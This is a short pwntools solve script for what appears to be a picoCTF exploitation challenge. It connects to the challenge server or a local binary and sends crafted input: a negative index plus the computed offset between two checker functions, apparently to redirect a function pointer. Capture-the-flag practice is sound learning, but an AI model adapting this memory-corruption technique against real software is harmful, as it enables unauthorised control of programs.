#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 51330)

    return r


def main():
    r = conn()

    log.info(f"{hex(exe.symbols.easy_checker)=}")
    log.info(f"{hex(exe.symbols.hard_checker)=}")

    easyminushard = exe.symbols.easy_checker - exe.symbols.hard_checker

    log.info(f"{hex(easyminushard)=}")

    r.sendlineafter(b'>> ', b'A' * 20 + b'%' * 1)
    r.sendlineafter(b'than 10.\n', b'-16 ' + str(easyminushard).encode())

    while True:
        print(r.recvline())


if __name__ == "__main__":
    main()
